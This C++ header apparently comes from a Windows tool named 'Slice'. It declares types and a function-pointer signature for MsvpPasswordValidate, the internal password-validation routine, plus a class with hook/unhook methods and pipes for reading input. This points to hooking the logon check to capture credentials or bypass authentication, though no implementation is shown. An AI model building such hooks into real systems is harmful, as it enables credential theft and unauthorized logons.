#pragma once

#include <Windows.h>

#include "utils/client_pipes.h"

typedef enum _NETLOGON_LOGON_INFO_CLASS {
	NetlogonInteractiveInformation = 1,
	NetlogonNetworkInformation,
	NetlogonServiceInformation,
	NetlogonGenericInformation,
	NetlogonInteractiveTransitiveInformation,
	NetlogonNetworkTransitiveInformation,
	NetlogonServiceTransitiveInformation
} NETLOGON_LOGON_INFO_CLASS;

#define CYPHER_BLOCK_LENGTH         8
typedef struct _CYPHER_BLOCK {
	CHAR    data[CYPHER_BLOCK_LENGTH];
}CYPHER_BLOCK;

typedef struct _USER_SESSION_KEY {
	CYPHER_BLOCK data[2];
} USER_SESSION_KEY, * PUSER_SESSION_KEY;

// function definition stuff
typedef char(_stdcall* MSVPPASSWORDValidate)(char a1, int a2, __int64 a3, struct _LM_OWF_PASSWORD* a4, PUCHAR a5, unsigned __int64* a6, unsigned __int64* a7);
typedef BOOLEAN(_stdcall* FnMsvpPasswordValidate)(BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	PVOID Passwords, //PUSER_INTERNAL1_INFORMATION Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey);

BOOLEAN MsvpPasswordValidate(BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	PVOID Passwords, //PUSER_INTERNAL1_INFORMATION Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey
);

// main Slice logic interface
class Slice {
public:
	Slice();
	void start();
	void stop();
	std::string readinput();

private:
	void hookfunc();
	void unhookfunc();

	void* pMsvpPasswordValidate;
	ClientPipes ioPipes;
};
